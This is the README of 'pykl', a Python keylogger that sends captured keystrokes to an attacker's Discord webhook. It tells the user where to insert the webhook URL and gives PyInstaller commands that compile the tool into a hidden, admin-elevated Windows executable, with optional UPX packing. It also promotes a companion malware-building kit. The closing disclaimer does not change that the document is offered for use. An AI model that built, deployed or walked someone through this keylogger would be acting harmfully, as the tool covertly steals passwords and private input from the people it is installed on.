# pykl
Python keylogger through Discord Webhook.

Paste your Discord Webhook URL in Line 26.

Want to write your own malware? PyWare is a pre-built Python malware that is easy to use, you'll only need to write a few lines and assert some configurations and tada, you have your own malware! Link: https://github.com/lilmond/PyWare

# Convert to EXE?
Execute the commands below:
```
pip install -r requirements.txt
pip install PyInstaller
python -m PyInstaller pykl3.py --onefile --icon NONE --noconsole --uac-admin
```

For smaller file size
```
python -m venv venv
venv\Scripts\activate
pip install -r requirements.txt
pip install PyInstaller
python -m PyInstaller pykl3.py --onefile --icon NONE --noconsole --uac-admin
```

If you have want to use UPX, download the official release at: https://github.com/upx/upx/releases/ and then copy and paste the folder into the same folder, rename it "upx" and then execute the following command:
```
python -m PyInstaller pykl3.py --onefile --icon NONE --noconsole --uac-admin --upx-dir ./upx
```

# Note
The original author will not be responsible for any misuse of this software. The distribution of this software without prior authorization to whom you will distribute it to, may and will cause you legal liabilities. Once again, the original author will not be held accountable or responsible for any consequences you take!
